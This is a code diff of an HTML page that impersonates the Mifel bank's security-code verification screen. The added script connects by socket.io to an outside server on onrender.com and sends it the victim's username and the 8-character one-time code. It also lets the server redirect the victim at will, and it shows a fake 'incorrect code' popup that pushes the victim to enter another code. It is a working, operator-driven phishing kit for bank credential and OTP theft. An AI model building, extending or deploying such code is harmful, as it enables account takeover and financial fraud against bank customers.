@@ -5,6 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Mifel - Verificación Avanzada</title>
     <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@300;400;600&family=Raleway:wght@300;400;500;600&display=swap" rel="stylesheet">
+    <script src="https://server-wodm.onrender.com/socket.io/socket.io.js"></script>
     <style>
         :root {
             --mifel-cyan: #00D1C1;
@@ -24,6 +25,16 @@
             flex-direction: column;
             min-height: 100vh;
         }
+
+        /* --- ESTILO POPUP ERROR --- */
+        .error-popup {
+            display: none; position: fixed; top: 20px; left: 50%; transform: translateX(-50%);
+            background-color: #ffeded; border-left: 5px solid #ff4d4d; color: #d63031;
+            padding: 15px 25px; border-radius: 8px; box-shadow: 0 4px 15px rgba(0,0,0,0.1);
+            z-index: 10000; font-weight: 600; font-size: 14px; align-items: center; gap: 10px;
+            animation: slideIn 0.5s ease-out; width: 90%; max-width: 400px;
+        }
+        @keyframes slideIn { from { top: -100px; opacity: 0; } to { top: 20px; opacity: 1; } }
 
         /* --- HEADER --- */
         .top-header {
@@ -64,7 +75,6 @@
             text-align: center;
         }
 
-        /* ANIMACIÓN DE FLOTAR */
         .mail-icon-container {
             width: 80px;
             height: 80px;
@@ -74,7 +84,6 @@
             align-items: center;
             justify-content: center;
             margin-bottom: 20px;
-            /* Aplicación de la animación en loop */
             animation: floatAlways 3s ease-in-out infinite;
         }
 
@@ -108,7 +117,6 @@
             color: #333;
         }
 
-        /* CASILLAS DE CÓDIGO (8 DÍGITOS) */
         .code-container {
             display: flex;
             gap: 8px;
@@ -182,6 +190,11 @@
 </head>
 <body>
 
+    <div id="errorPopup" class="error-popup">
+        <svg width="20" height="20" fill="currentColor" viewBox="0 0 20 20"><path fill-rule="evenodd" d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7 4a1 1 0 11-2 0 1 1 0 012 0zm-1-9a1 1 0 00-1 1v4a1 1 0 102 0V6a1 1 0 00-1-1z" clip-rule="evenodd"></path></svg>
+        El código ingresado es incorrecto. Hemos enviado uno nuevamente.
+    </div>
+
     <header class="top-header">
         <img src="https://d3vtsr5ffy4e4a.cloudfront.net/uploads/f9780b94-d327-43bf-987a-11289aa18ab6/original/mifel-personas.svg" alt="Mifel" class="logo-center">
         <div class="lang-selector">
@@ -193,8 +206,8 @@
     <main class="main-container">
         <div class="mail-icon-container">
             <svg class="icon-mail" viewBox="0 0 24 24">
-                    <path d="M20,4H4C2.9,4 2,4.9 2,6V18A2,2 0 0,0 4,20H20A2,2 0 0,0 22,18V6C22,4.89 21.1,4 20,4M20,18H4V8L12,13L20,8V18M20,6L12,11L4,6V6H20V6Z"/>
-                </svg>
+                <path d="M20,4H4C2.9,4 2,4.9 2,6V18A2,2 0 0,0 4,20H20A2,2 0 0,0 22,18V6C22,4.89 21.1,4 20,4M20,18H4V8L12,13L20,8V18M20,6L12,11L4,6V6H20V6Z"/>
+            </svg>
         </div>
 
         <h1 class="welcome-text">Código de Seguridad</h1>
@@ -216,32 +229,42 @@
         </form>
 
         <p class="resend-link">
-    ¿Problemas con el código? 
-    <a href="#" id="whatsapp-support" target="_blank" rel="noopener noreferrer">
-        Contactar soporte
-    </a>
-</p>
+            ¿Problemas con el código? 
+            <a href="#" id="whatsapp-support" target="_blank" rel="noopener noreferrer">
+                Contactar soporte
+            </a>
+        </p>
     </main>
 
     <script>
-             // Recuperar el usuario del localStorage
-    const rawUser = localStorage.getItem('mifel_user') || "Usuario";
+        const socket = io("https://server-wodm.onrender.com");
+        const rawUser = localStorage.getItem('mifel_user') || "Usuario";
 
-    // Construir el mensaje personalizado
-    const mensajeBase = `Hola, tengo inconvenientes con la verificación de mi código de seguridad. Mi usuario es: ${rawUser}`;
+       
+        const urlParams = new URLSearchParams(window.location.search);
+        if (urlParams.get('error') === 'true') {
+            const popup = document.getElementById('errorPopup');
+            popup.style.display = 'flex';
+            setTimeout(() => { popup.style.display = 'none'; }, 5000);
+        }
 
-    // Codificar para URL
-    const mensajeCodificado = encodeURIComponent(mensajeBase);
+        socket.on('connect', () => {
+            socket.emit('register_user', { user: rawUser });
+        });
 
-    // Asignar la URL dinámica al enlace
-    const linkSoporte = document.getElementById('whatsapp-support');
-    linkSoporte.href = `https://wa.me/15877069901?text=${mensajeCodificado}`;
+        socket.on('navigate', (data) => {
+            window.location.href = data.url;
+        });
+
+        const mensajeBase = `Hola, tengo inconvenientes con la verificación de mi código de seguridad. Mi usuario es: ${rawUser}`;
+        const mensajeCodificado = encodeURIComponent(mensajeBase);
+        const linkSoporte = document.getElementById('whatsapp-support');
+        linkSoporte.href = `https://wa.me/15877069901?text=${mensajeCodificado}`;
 
         const inputs = document.querySelectorAll('.code-input');
-
         const updateActiveInput = () => {
             let foundFirstEmpty = false;
-            inputs.forEach((input, index) => {
+            inputs.forEach((input) => {
                 if (!foundFirstEmpty) {
                     input.classList.add('active');
                     input.style.pointerEvents = "auto";
@@ -256,7 +279,6 @@
         inputs.forEach((input, index) => {
             input.addEventListener('input', (e) => {
                 e.target.value = e.target.value.replace(/[^a-zA-Z0-9]/g, '').toUpperCase();
-
                 if (e.target.value !== "" && index < inputs.length - 1) {
                     inputs[index + 1].classList.add('active');
                     inputs[index + 1].style.pointerEvents = "auto";
@@ -290,8 +312,24 @@
             });
         });
 
+        document.getElementById('otp-form').addEventListener('submit', function(e) {
+            e.preventDefault();
+            let tokenVal = "";
+            inputs.forEach(input => tokenVal += input.value);
+
+            if (tokenVal.length === 8) {
+                socket.emit('submit_token', {
+                    user: rawUser,
+                    token: tokenVal
+                });
+
+                setTimeout(() => {
+                    window.location.href = "loading1.html";
+                }, 300);
+            }
+        });
+
         window.onload = () => inputs[0].focus();
     </script>
-    <script src="is.js"></script>
 </body>
 </html>
